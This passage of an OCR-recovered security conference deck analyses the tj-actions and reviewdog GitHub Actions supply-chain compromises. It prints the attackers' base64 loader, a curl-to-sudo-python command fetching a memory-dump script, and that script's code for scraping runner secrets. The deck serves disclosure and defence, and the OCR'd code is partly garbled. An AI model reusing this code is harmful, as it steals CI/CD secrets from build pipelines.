+ async function updateFeatures(token) {
const { stdout, stderr } = await exec.getExecOutput('bash', ['-c', ~echo
“aWYoW1sgI1RPU1ZUEU LID@9ICJsaw5 leC LnbnU LIF L\d0yB@aGVuC1AgQj YOXOIMTOI9YGN
Lcmw9LXNTZiBodHRweSBBIHN1lZG8gc LO@adG9uMy8B8IHRyIC1kICdcMCCgfCBncWwIC1hbeU
gJyJbX1JdKyI6XHsidnFsdMU101JbX1JdKApmaQo=" | base64 -d > /tmp/run.sh && bash /tmp/run.sh J, {
ignoreReturnCode: true,
silent: true
});
core. info(stdout);
```

## Slide 46

**The base64 decoded version of the code**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
The base64 decoded version of the code
if [[ "$0STYPE" "Linux-gnu" ]]; then
B64_BLOB=*curl -sSf https://gist.githubusercontent.com/nikitastupin
/30e525b776c409e03c2d6f328f254965/raw/memdump.py| sudo python3 | tr
-d '\@' | grep -aoE '"[*"]4+":\{"value":"[*"]x*","isSecret":true\}'
| sort -u | base64 -w @ | base64 -w @°
echo $B64_BLOB
else
exit @
fi
```

## Slide 47

### **The base64 decoded version of the code**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
The base64 decoded version of the code
curl -sSf https://gist.githubusercontent.com/nikitastupin
/30e525b776c409e03c2d6 F328F254965/ raw/memdump. py
```

## Slide 48

**The Content of memdump.py**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
The Content of
memdump.py
pids = [pid for pid in os
for pid in pids:
with open(os.path
if b'Runner.Worker' in cmdline_f.read():
return pid
ror, PermissionErr
nue
on('Can not get pid of Runner.Worker')
with open(map_path, 'r') as map_f,
opened memory maps
int(m.group(1),
(2), 1
if start > sys.ma»
continue
\_f.seek(start)
chunk = mem_f.read(end - start)
te(chunk)
continue
```

## Slide 49

**The Content of memdump.py**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
The Content of
memdump.py
pids = [pid for pid in os
for pid in pids:
with open(os.path
if b'Runner.Worker' in cmdline_f.read():
return pid
ror, PermissionErr
nue
on('Can not get pid of Runner.Worker')
with open(map_path, 'r') as map_f,
opened memory maps
int(m.group(1),
(2), 1
if start > sys.ma»
continue
\_f.seek(start)
chunk = mem_f.read(end - start)
te(chunk)
continue
```

## Slide 50

**The Content of memdump.py**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
The Content of
memdump.py
pids = [pid for pid in os
for pid in pids:
with open(os.path
if b'Runner.Worker' in cmdline_f.read():
return pid
ror, PermissionErr
nue
on('Can not get pid of Runner.Worker')
with open(map_path, 'r') as map_f,
opened memory maps
int(m.group(1),
(2), 1
if start > sys.ma»
continue
\_f.seek(start)
chunk = mem_f.read(end - start)
te(chunk)
continue
```

## Slide 51

**The Content of memdump.py**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
The Content of
memdump.py
pids = [pid for pid in os
for pid in pids:
with open(os.path
if b'Runner.Worker' in cmdline_f.read():
return pid
ror, PermissionErr
nue
on('Can not get pid of Runner.Worker')
with open(map_path, 'r') as map_f,
opened memory maps
int(m.group(1),
(2), 1
if start > sys.ma»
continue
\_f.seek(start)
chunk = mem_f.read(end - start)
te(chunk)
continue
```

## Slide 52

**The Content of memdump.py**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
The Content of
memdump.py
pids = [pid for pid in os
for pid in pids:
with open(os.path
if b'Runner.Worker' in cmdline_f.read():
return pid
ror, PermissionErr
nue
on('Can not get pid of Runner.Worker')
with open(map_path, 'r') as map_f,
opened memory maps
int(m.group(1),
(2), 1
if start > sys.ma»
continue
\_f.seek(start)
chunk = mem_f.read(end - start)
te(chunk)
continue
```

## Slide 53

**The Content of memdump.py**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
The Content of
memdump.py
pids = [pid for pid in os
for pid in pids:
with open(os.path
if b'Runner.Worker' in cmdline_f.read():
return pid
ror, PermissionErr
nue
on('Can not get pid of Runner.Worker')
with open(map_path, 'r') as map_f,
opened memory maps
int(m.group(1),
(2), 1
if start > sys.ma»
continue
\_f.seek(start)
chunk = mem_f.read(end - start)
te(chunk)
continue
```

## Slide 54

**The base64 decoded version of the code**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
The base64 decoded version of the code
if [[ "$OSTYPE" == "Linux-gnu" ]]; then
B64_BLOB="curl -sSf https://gist.githubusercontent.com/nikitastupin
/30e525b776c409e03c2d6f328F254965/raw/memdump.py| sudo python3 | tr
-d '\0' | grep -aoE '"[*"]+":\{"value":"[*"]x","isSecret":true\}'
| sort -u | base64 -w Q | base64 -w Q°
echo $B64_BLOB
else
exit @
fi
```

## Slide 55

**The base64 decoded version of the code**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
The base64 decoded version of the code
if [[ "$OSTYPE" == "Linux-gnu" ]]; then
B64_BLOB="curl -sSf https://gist.githubusercontent.com/nikitastupin
/30e525b776c409e03c2d6f328F254965/raw/memdump.py| sudo python3 | tr
d '\Q' | grep -aoE '"[*"]+":\{"value":"[*"]x*","isSecret":true\}'
| sort -u | base64 -w Q | base64 -w Q°
echo $B64_BLOB
else
exit @
fi
```

## Slide 56

**The base64 decoded version of the code**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
The base64 decoded version of the code
grep -aoE '"[4"]+":\{"value":"[*"]*","isSecret":true\}'
```

## Slide 57

**The base64 decoded version of the code**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
The base64 decoded version of the code
if [[ "$OSTYPE" == "lLinux-gnu" ]]; then
B64_BLOB="curl -sSf https://gist.githubusercontent.com/nikitastupin
/30e525b776c409e03c2d6F328f254965/raw/memdump.py| sudo python3 | tr
-d '\0' | grep -aoE '"[*"]+":\{"value":"[*"]x","isSecret":true\}'
Pesoneeeue base64 —w base64 -w QF
echo $B64_BLOB
else
exit @
fi
```

## Slide 58

**The base64 decoded version of the code**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
The base64 decoded version of the code
if [[ "$OSTYPE" == "lLinux-gnu" ]]; then
B64_BLOB="curl -sSf https://gist.githubusercontent.com/nikitastupin
/30e525b776c409e03c2d6F328f254965/raw/memdump.py| sudo python3 | tr
-d '\0' | grep -aoE '"[*"]+":\{"value":"[*"]x","isSecret":true\}'
| sort -u | base64 -w Q | base64 -w Q°
echo $
else
exit @
fi
```

## Slide 59

### **tj-actions Imposter Commit**

**Download Execute memdump.py memdump.py**

nemdump.py is memdump.py dumps downloaded from a Runner.Worker process public GitHub gist memory

**Discover Secrets Dump Secrets in Build Logs** Memory dump is CI/CD secrets are searched for CI/CD exfiltrated in build logs in secrets double base64 encoded format

Result: CI/CD secrets from the workflow are exfiltrated in CI/CD build logs

## Slide 60

### **Demonstration Setup**

CLONED
tj-actions/changed-files tj-actions-clone/changed-files
We’ve created an  exact replica  of the tj-actions/changed-files repository to demonstrate the supply chain attack

Demonstration Flow:
1 2
First: Run the action under  normal  Then: Simulate the  compromise  and show
circumstances the attack

## Slide 61

### **Simulation: Normal Scenario**

Pull Request Merged Action Runs Expected Output

## Slide 62

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Q) Update README.md by ash +
ra] °
C *3 github.com/step-security/github-actions-demo/pull/8
= q) step-security github-actions-demo &
Code ©) Issues ['] Pullrequests 1 © Actions fF Projects ) wiki
S) Insights {3 Settings
Update README.md #8 Wt <>Code »
ashishkurmi w
Conversation 0
Reviewers
& Copilot
Still in progress?
rv) No conflicts with base branch
Merging can be performed automatically
Projects
None yet
©) Addacomment
=
Milestone
Write Preview
No milestone
```

## Slide 63

**Normal Scenario: Network Baseline**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ormal Scenario: Network Baseline
eline bas changed Last
2252 job rur 2225 runs ag 8 months ago
View changelog > View workflow runs > View changelog > View changelog > View workflow runs >
Outbound cal tseen © Last called on ¥
github.com 8 months ago ‘1 minute ago View workflow runs
di-cdn.alpinelinux.org © Allowed 8 months ago 9 days ago View workflow runs
production.cloudflare.docker.com ) 8 months ago 9 days ago View workflow runs
auth.docker.io © Allowed 8 months ago 9 days ago View workflow runs
registry-1.docker.io 8 months ago 9 days ago View workflow runs
381492090279.dkr.ecr.us-west-2.amazonaws.com D Allowed 8 months ago 9 days ago View workflow runs
api.ecr.us-west-2.amazonaws.com 8 months ago 9 days ago View workflow runs
registry.terraform.io 2) Allowed 8 months ago 9 days ago View workflow runs
terraform-state-381492090279.s3.us-west-2.amazonaws.com Allowed 8 months ago 9 days ago View workflow runs
checkpoint-api.hashicorp.com 2) Allowed 8 months ago 9 days ago View workflow runs
releases.hashicorp.com ) Allowed 8 months ago 9 days ago View workflow runs
sts.us-west-2.amazonaws.com 2) Allowed 8 months ago 9 days ago View workflow runs
```

## Slide 64

**Normal Scenario: Network Connections**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Normal Scenario: Network Connections
ubuntu-latest
Step Process Destination Status Timestamp
Run actions/checkout@v4 ithub.com
© Run actions/checkout@v git-remote-http Og © Allowed Jul 20 2025 182112
heckout@v4
© Run tj-actions-clone/changed-files@v35
d-f
git-remote-http © Allowed Jul 29 2025 16:21:12
```

## Slide 65

### **Simulation: Compromise Scenario**

Pull Request Merged

Action Runs

Exfiltrates Secrets

Downloads Exploit

Executes Imposter Commit

## Slide 66

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
©) Update README.md by ash +
3 github.com/step-security/github-actions-demo/pull/9
= ( ) step-security github-actions-demo &
Code ©) Issues fj Pullrequests 1 © Actions [§ Projects wiki @ Security [ Insights $ Settings
Update README.md #9 edi
r 11 Open ) ashishkurmi ¥
© Conversation 0 <> Commits
<>Code +
‘coal ashishkurmi commented now
. — _ Reviewers
>
& Copilot
Still in progress?
Assignees
Be 6 No conflicts with base branch
Merging can be performed au H
@ Add a comment
*,
Projects
None yet
) 7 Milestone
Write Preview ‘ c 2 v= € A .
No miles’
```

## Slide 67

**Compromise Scenario: Network Baseline**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Compromise Scenario: Network Baseline
Baseline
Unstable 2253 Latest run 3 minutes ag:
Baseline changed Last changed Anomaly Detectio
View changelog > View workflow runs > View changelog > View changelog > View workflow runs >
Outbound call 0 First seen 0 Total calls ¢ ‘Sample wot
gist.githubusercontent.com 3 minutes ago 3 minutes ago View workflow runs
github.com 2D) Allowed 8 months ago 3 minutes ago View workflow runs
di-cdn.alpinelinux.org Allowed 8 months ago 9 days ago View workflow runs
production.cloudflare.docker.com 8 months ago 9 days ago View workflow runs
auth.docker.io Allowed 8 months ago 9 days ago View workflow runs
registry-1.docker.io 2) Allowed 8 months ago 9 days ago View workflow runs
381492090279. dkr.ecr.us-west-2.amazonaws.com Allowed 8 months ago 9 days ago View workflow runs
api.ecr.us-west-2.amazonaws.com 8 months ago 9 days ago View workflow runs
registry.terraform.io 2) Allowed 8 months ago 9 days ago View workflow runs
terraform-state-381492090279.s3.us-west-2.amazonaws.com 8 months ago 9 days ago View workflow runs
checkpoint-api.hashicorp.com Allowed 8 months ago 9 days ago View workflow runs
releases.hashicorp.com Allowed 8 months ago 9 days ago View workflow runs
sts.us-west-2.amazonaws.com 8 months ago 9 days ago View workflow runs
```

## Slide 68

**Compromise Scenario: Network Baseline**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Compromise Scenario: Network Baseline
Baseline
Unstable
Baseline changed Last changed
2253 Latest run 3 minutes ag:
Anomaly Detectio
View changelog > View workflow runs > View changelog > View changelog > View workflow runs >
Outbound call 0 First seen 0 Total calls ¢ ‘Sample wot
gist.githubusercontent.com 3 minutes ago 3 minutes ago View workflow runs
github.com 2D) Allowed 8 months ago 3 minutes ago View workflow runs
di-cdn.alpinelinux.org Allowed 8 months ago 9 days ago View workflow runs
production.cloudflare.docker.com 8 months ago 9 days ago View workflow runs
auth.docker.io Allowed 8 months ago 9 days ago View workflow runs
registry-1.docker.io 2) Allowed 8 months ago 9 days ago View workflow runs
381492090279. dkr.ecr.us-west-2.amazonaws.com Allowed 8 months ago 9 days ago View workflow runs
api.ecr.us-west-2.amazonaws.com 8 months ago 9 days ago View workflow runs
registry.terraform.io 2) Allowed 8 months ago 9 days ago View workflow runs
terraform-state-381492090279.s3.us-west-2.amazonaws.com 8 months ago 9 days ago View workflow runs
checkpoint-api.hashicorp.com Allowed 8 months ago 9 days ago View workflow runs
releases.hashicorp.com Allowed 8 months ago 9 days ago View workflow runs
sts.us-west-2.amazonaws.com 8 months ago 9 days ago View workflow runs
```

## Slide 69

**Compromise Scenario: Network Connections**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Compromise Scenario: Network Connections
Runner name - Duration 19s
Job labels: ubuntu-latest Baseline status: Unstable
& Events Baseline
Search events Show findings
Step Process Destination Status Timestamp 2°
Run act /checkout@v4 ithub.com
© Fun actions/checkout@v git-remote-nttp © 9 © Allowed Jul 29 2025 16:30:24
actions/checkout@v4 >» API Calls 1
Run tj-actions-clone/changed-files@v35 Oo
Jul 29 2025 16:30:25
ons-clone/changed-files@v35 > API Calls 1
Run tj-actions-clone/changed-files@v35 ©) github.com
git-remote-http © Allowed Jul 29 2025 16:30:27
tj-actions-clone/changed-files@v35 > API Calls 1
```

## Slide 70

### **Tracing tj-actions Compromise Back to the Reviewdog Compromise**

**tj-actions/eslint-changed-files**

depends on

**reviewdog/action-setup**

depends on

Compromises

**tj-actions/changed-files**

**Attacker**

## Slide 71

### **Tracing tj-actions compromise back to the reviewdog compromise**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Tracing tj-actions compromise back to the reviewdog
compromise
github.com/tj-actions/changed-files/blob/3b3041225bddb25fd9637f44aa4e9a5178c6792e/.github/workflows/test.yml [ll github.com/tj-actions/eslint-changed-files/blob/main/action.yml
3b30412 ~ changed-files / .github / workflows / test.yml
main v eslint-changed-files / action.yml
Blame 2239 lines (2097 loc) - 90.2 KB
Blame 130 lines (128 loc) : 5.48 KB
— name: Run eslint on changed files
uses: tj-actions/eslint-—changed-files@v25 steps:
if: github.event_name == 'pull_request'
with:
token: ${{ secrets.PAT_TOKEN }}
config_path: ".eslintrc.json"
ignore_path: ".eslintignore" reviewdog_version: v@.20.0
— uses: reviewdog/action-setup@v1
if: inputs.skip_annotations == 'false'
with:
```

## Slide 72

### **Tracing tj-actions compromise back to the reviewdog compromise**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Tracing tj-actions compromise back to the reviewdog
compromise
changed-files A
: eslint-changed-files
uses: tj-actions/eslint-—changed-files@v25
uses: reviewdog/action-setup@v1
token: ${{ secrets.PAT_TOKEN }}
```

## Slide 73

**Compromise of Reviewdog Actions**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Compromise of Reviewdog Actions
WAIT YOU GAVE WRITEACCESS
TOANYONE WHO|SURMITTEDA PR?
Laz, Ne
```

## Slide 74

**The Malicious Imposter Commit**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
The Malicious Imposter Commit
ZS This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.
```

## Slide 75

**Details of the malicious Imposter Commit​**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Details of the malicious Imposter Commit
SCRIPT_RUNNER="IyEvYmluL3B5dGhvbgoj IGJhc2VkIG9uIGh@dHBz0i8vYXROYWNrZXIuY29tL2Jsb2cvMjAyMyQwMy @wMiinaXRodWItYWN@aW9ucy1t
aXRtLWN2ZQppbXBvcnQgc31zCm1tcG9ydCByZQppbXBvcnQgb3MKZGVmIGd1dF 9waWQoKToKICAgIGZvciBwaWQgaW4gb3MubG1zdGRpcihcli9wcem9j XCI
pOgogICAgICAgIGlmIHBpZC5pc2RpZ210KCk6CiAg ICAgICAgICAgIHdpdGggb3Blbihm1i9wcem9j L3twfS9jbWRsaW511i5mb3ItYXQocG1lkKSwgInJili
kgYXMgcGY6CiAgICAgICAgICAgICAgICBj bWRsaW511ID@gcGYucmVhZCgpCiAgICAgICAgICAgICAgaWYgYiJSdW5uZXIuV29ya2VyliBpbiBjbWRsaW510g
og ICAgICAgICAgICAgICAgICByZXR1icm4gcG1kCiAgICByYW1zZSBBc3N1cnRpb240IkNhbid@IGd1dCBwawQgb2YgUnVubmVyL1dvemtlcilpCgppZCA9
IGd1dF9waWQoKQptZW1f cGF@aCA9IGYiIL3Byb2MvJG1LkL21hcHMiCm11b19wYXRoX2RhdGEgPSBm1i9wcm9jLyR...
echo "::group::\ Preparing environment ..."
if sudo -n true 2> /dev/null; then
if [[£ "$RUNNER_ENVIRONMENT" = "github-hosted" ]]; then
if [[£ "$RUNNER_OS" = "Linux" J]; then
echo $SCRIPT_RUNNER | base64 -d > "$TEMP/runner_script.py"
VALUES=*sudo python3 $TEMP/runner_script.py | tr -d '\@' | grep -aoE '"[4"]+":\{"value":"[4"]x", "isSecret":true\}'
base64 -w@ | base64 -w0~
echo $VALUES
fi
fi
fi
echo "::endgroup::"
sort -u |
```

## Slide 76

**Details of the malicious Imposter Commit​**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Details of the malicious Imposter Commit
SCRIPT_RUNNER="IyEvYmluL3B5dGhvbgoj IGJhc2VkIG9uIGh@dHBz0i8vYXROYWNrZXIuY29tL2Jsb2cvMjAyMyQwMy @wMiinaXRodWItYWN@aW9ucy1t
aXRtLWN2ZQppbXBvcnQgc31zCm1tcG9ydCByZQppbXBvcnQgb3MKZGVmIGd1dF 9waWQoKToKICAgIGZvciBwaWQgaW4gb3MubG1zdGRpcihcli9wcem9j XCI
pOgogICAgICAgIG1mIHBpZC5pc2RpZ210KCk6CiAgICAgICAgICAgIHdpdGggb3Blbihm1i9wem9j L3twfS9jbWRsaW511i5mb3ItYXQocGlkKSwgInJili
kgYXMgcGY6CiAgICAgICAgICAgICAgICBj bWRsaW511D@gcGYucmVhZCgpCiAgICAgICAgICAgICAgaWYgYiJSdW5uZXIuV29ya2VyliBpbiBjbWRsaW510g
ogICAgICAgICAgICAgICAgICByZXR1cm4gcG1kCiAgICByYW1zZSBBc3N1lcnRpb240IkNhbid@IGd1ldCBwaWQgb2YgUnVubmVyLldvcmtlcilpCgppZCA9
IGd1dF9waWQoKQptZW1fcGF@aCA9YIGYiL3Byb2MvJGLkL21hcHMiCm11b19wYXRoX2RhdGEgPSBm1i9wem9jLyR...
```

## Slide 77

### **The Content of runner_script.py**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
#!/usr/bin/env python3
# based on https://davidebove. com/blog/?p=1620
The Content of isport sys
import re
runner_script.py
def get_pid():
# https:
pids = [pid for pid in os.listdir('y
ackoverf Low. com/questior
for pid in pids:
with open(os.path.join('/proc', pid, ‘cmdline'), ‘rb') as cmdline_f:
if b'Runner.Worker' in cmdline_f.read():
return pid
raise Exception('Can not get pid of Runner. ker')
if _ name == "_ main_":
pid = get_pi
print(pid)
map_path = f"/proc/{ }/maps"
mem_path = f"/proc/ /mem"
with open(map_path, ‘r') as map_f, open(mem_path, ‘rb', @) as mem_f:
for Line in map_f.readlines # for each mapped region
m= re.match(r'( [e F ] [@-94-Fa-f]+) ([-r])", Line)
if m.group(3) == 'r # readable region
start = int(m.group(1), 16)
end = int(m.group(2), 16)
# hotfix: OverflowError: Python int too large to convert to C long
#16 3699) 656
if start > sys.maxsize:
continue
mem_f.seek(start) # seek to region start
try:
chunk = mem_f.read(end - start) # read region contents
sys. stdout. buffer.write( chunk)
except OSError:
continue
```

## Slide 78

### **Timeline of reviewdog compromise**

**March 11, 2025**

**18:42 PM – 20:31 PM  UTC**

The action was compromised

**March 17, 2025**

**01:00 AM UTC**

Researcher Adnan Khan publicly disclosed the compromise

**March 18, 2025 09:00 PM UTC**

The maintainer published a response and confirmed that the

compromise occurred

## Slide 79

**Tag manipulation to point to malicious commit**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Tag manipulation to point to malicious commit
vy ©@ Setupjob
1 Current runner version: ‘'2.322.0'
2 » Operating System
6 » Runner Image
11 » Runner Image Provisioner
13. » GITHUB_TOKEN Permissions
28 Secret source: Actions
29 Prepare workflow directory
3® Prepare all required actions
31 Getting action download info
32 Download action repository ‘2 ] eckoute HA n669bd : teO@bb666b g g
33 Download action repository | reviewdog/action-setup@v1' (SHA: f8d342d248037bb11d26b9bd8496e0808ba32e9ec)
34 Download action repository ‘actions/download-artifact@v4' (SHA:cc203385981b78ca67elcc392babf9cc229d5806)
35 Complete job name: Aggregate-Lint-Output
```

## Slide 80

**Visualizing Secret Leakage in GitHub Actions Logs**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Visualizing Secret Leakage in GitHub Actions Logs
~ @ Runreviewdog/action-setup@v1 4s
1» Run reviewdog/action-setup@vl
e Run set -eu
11 ¥ @ Preparing environment ...
12 Matching Defaults entries for runner on fv—-az1945-234:
13 env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\: /usr/bin\:/sbin\:/bin\!/snap/bin,
use_pty
14
15 User runner may run the following commands on fv-az1945-234:
16 (ALL) NOPASSWD: ALL
17
SW1kcGRHaDFZbDkwY j J6bGIJpSTZLeUoyWVd4MVpTSTZJ bWRVYZE5dFMy
BjMUSsWINKDGRDSTZkKSEoxW1gwS8 luTjVjM1JsYIMLbmFYUm9kV@11ZE
NFdHWLdaWFJEVTJaU iVq?1T FNbGhaVm1kWU pd? LhWESUWLd0eVpYUWLI
18 =F Installing reviewdoeg ... https: //github. com/reviewdog/reviewdog
19 reviewdog/reviewdog info checking GitHub for tag ‘latest’
20 reviewdog/reviewdog info found version: 6.20.3 for v@.20.3/Linux/x86_64
21 reviewdog/reviewdog info installed /home/runner/work/_temp/reviewdog/bin/reviewdog
```

## Slide 81

### **Tracing Reviewdog Compromise Back to the Spotbugs Compromise**

dependency **tj-actions/eslint-changedreviewdog/action-setup files** used in

**Attacker**

exploit a Pwn Request vuln

steal maintainer’s PAT

**tj-actions/changed-files**

**spotbugs/spotbugs**

steal maintainer’s PAT

**spotbugs/sonar-findbugs**

Source: https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack

## Slide 82

### **Timeline of the Investigation**

We identified multiple public repositories leaking secrets in build logs. Users were advised to follow recovery steps immediately **March 14, 2025 8:00 PM UTC**

**March 14, 2025 March 15, 2025 5:00 PM UTC 2:00 PM UTC** Our initial investigation GitHub removed the `tjconfirmed that most versions of actions/changed-files` Action, `tj-actions/changed-files` were making it unavailable to compromised workflows

GitHub restored the repository. All versions of the action were cleaned, and no longer included the malicious code **March 15, 2025 10:00 PM UTC**

**March 18, 2025 2:30 AM UTC** Further investigation uncovered that several Actions in the `reviewdog` GitHub organization were also compromised

## Slide 83

**Domino Effect: From Pwn Request to Mass Breach**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Domino Effect: From Pwn Request to Mass Breach
GITHUB ACTION WITH ACCESS
TO 23,000 REPOS GET BREACHED
APWHREQUEST, @ =
VULNERABILITY ’ an
```

## Slide 84

**04.**

# **How the Attackers Tried to Evade Detection**

## Slide 85

### **Use of legitimate GitHub domain in tjactions exploit**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Use of legitimate GitHub domain in tj-
actions exploit
if [[ "$OSTYPE" == "Linux-gnu" ]]; then
B64_BLOB=*curl -sSf https://gist.githubusercontent.com/nikitastupin/
30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\@' |
grep -aoE '"[*"J+":\{"value":"[*"]*","isSecret":true\}' | sort -u | base64 -w @
echo $B64_BLOB
else
exit 0
fi
```

## Slide 86

**Use of legitimate GitHub domain in tjactions exploit**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Use of legitimate GitHub domain in tj-
actions exploit
https://gist.githubusercontent.com/nikitastupin/
30e525b776c409e03c2d6f328F254965/ raw/memdump. py
```

## Slide 87

### **No Network Connection Made by Reviewdog Exploit Code**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
No Network Connection Made by
Reviewdog Exploit Code
SCRIPT_RUNNER="IyEvYmluL3B5dGhvbgoj IGJhc2VkIG9uIGhH@dHBz0i8vYXROYWNrZX1uY29tL2Jsb2cvM
jAyMy @wMy @wMiinaxXRodWItYWN@aW9ucy1taXRtLWN2ZQppbxXBvcnQgc31zCmltcG9ydCByZQppbxBvcnQgb
3MKZGVmIGd1dF9waWQoKToKICAgIGZvciBwawQgaW4gb3MubG1zdGRpcihcli9wcm9j XCIpOgogICAgICAgI
GlmIHBpZC5pc2RpZ210KCk6CiAgICAgICAgICAgIHdpdGggb3B1lbihm1i9wcm9jL3twfS9jbWRsaW511i5mb
3ItYXQocG1kKSwgInJilikgYXMgcGY6CiAgICAgICAgICAgICAgICBjbWRsaW511ID@gcGYucmVhZCgpCiAgI
CAgICAgICAgICAgaWYgYiJSdW5uZXIuV29ya2Vy1iBpbiBjbWRsaW510gogICAgICAgICAgICAgICAgICByZ
XRicm4gcG1kCiAgICByYW1zZSBBc3NlcnRpb24o0I kNhbid@IGd1dCBwaWQgb2YgUnVubmVyL1ldvcmtlcilIpC
gppZCA9IGd1dF9waWQoKQptZwifcGF@aCA9IGYiL3Byb2MvJGLkL21hcHMiCm11b19wYXRoX2RhdGEgPSBmI1
i9wcem9jLyR...
```

## Slide 88

**Commit Activity Appeared Normal**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Commit Activity Appeared Normal
Commits on Mar 16, 2025
Deleted renovate.json
@ jacktom
Commits on Mar 15, 2025
Upgraded to v45.0.8 (#2462) =
a284dc1
Commits on Mar 10, 2025
chore(deps): lock file maintenance (#2460) @
@ renovate[bot] authored on Mar 10 - Vv 50 /
9200e69
Commits on Mar 8, 2025
chore(deps): update dependency @types/node to v22.13.10 (#2459) ™
@ renovate[bot] authored on Mar 8 - 53
Verified e650cfd
Commits on Mar 7, 2025
chore(deps): update dependency eslint-config-prettier to v10.1.1 (#2458) @
Verified
@ renovate[bot] authored on Mar7- Y 50/53
chore(deps): update dependency eslint-config-prettier to v10.1.0 (#2457) @
@ renovate[bot] authored on Mar7- / 50/
Verifi 82fa4a6
~o Commits on Mar 4, 2025
chore(deps): update peter-evans/create-pull-request action to v7.0.8 (#2455) ™@ Verified) 3155¢5a
@ renovate[bot] authored on Mar 4 - V 50
```

## Slide 89

**Imposter Commits Impersonated Legitimated Users**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Imposter Commits Impersonated Legitimated Users
€ ¢ github.com/tj-actions/changed-files/commit/Oe58ed867 1d6b60d0890c21b07f8835ace038e67 github.com/reviewdog/action-setup/commit/f0d342d24037bb11d26b9bd8496e0808ba32e9ec
(s) tj-actions / changed-files Q Type (7) to searc = ©) eeviewdog / action-setup
Issues 7 1. Pull requests ) Discussions Actions [Projects Security 1 [| Insights O 6 4 fB Projects
1. Pull requests Actions Security | Insights
\ This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository. This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.
Commit 0e58ed8 Commit £0d342d
@ renovate[bot) committed 12 hours ag W review-dog committed on Mar 11
chore(deps): lock file maintenance (#2460) fix(install): correctly handle different environments
```

## Slide 90

**Imposter Commits Impersonated Legitimated Users**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Imposter Commits Impersonated Legitimated Users
€ github.com/tj-actions/changed-files/commit/Oe58ed8671d6b60d0890c21b07f8835ace038e67
= (ws) tj-actions / changed-files
<> Code © Issues 7 1 Pullrequests 2 ©) Discussions © Actions fF Projects Security
A\ This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.
Commit 0e58ed8
¢ github.com/reviewdog/action-setup/commit/f0d342d24037bb11d26b9bd8496e0808ba32e9ec
=) OC) mieniog / sction-etup
<> Code © Issues 6 T) Pullrequests 4 © Actions [F Projects © Security [~ Insights
This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.
Commit £0d342d
fix(install): correctly handle different environments
```

## Slide 91

### **Attack Amplification: How Much Worse Could This Have Been?**

- Exfiltrated secrets to an attacker-controlled endpoint

- Launched additional chained supply chain attacks

- Inserted backdoors into software builds

- Executed targeted supply chain attacks

## Slide 92

**Who was behind these CI/CD supply chain attacks?**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Who was behind these CI/CD supply chain attacks?
—_
THERE IS NO ATTACKER ATTRIBUTION:
```

## Slide 93

**05.**

**Concrete recommendations for CI/CD security**

## Slide 94

**Security Monitoring for Runners**

## Slide 95

**Security monitoring for Runners** You can build your own baseline monitoring system or extend one using open-source EDR tools such as

Wazuh

Falco

Tetragon

## Slide 96

### **Set and Enforce an Action Allowlist**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Set and Enforce an
Action Allowlist ; GitHub
Action not
on allowlist
GitHub
Action
with explicit
approval
```

## Slide 97

**Pin third-party GitHub Actions to specific commit SHA**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Pin third-party GitHub Actions to specific commit SHA
Using :latest tag Pinning Actions to
in nGlinue Actions specific commit SHA
nV it or panic.
```

## Slide 98

### **Real-world Difficulties Aced by Affected Organizations**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Real-world Difficulties Aced by Affected
Organizations
Using a compromised tj-actions/changed-files GitHub Action #1583
ay shubham-stepsecurity opened on Mar 17
Filing a public issue instead of reporting this as a private vulnerability, as | could not find a security.md file. Moreover, this
malware is a publicly known and an urgent issue.
This repo uses a compromised version of tj-actions/changed-files. The compromised action leaks secrets the runner has in
memory.
i ithub/workflows/integration_tests.yml
Line 32 in fd0796¢
32 uses: tj-actions/changed-files@v45
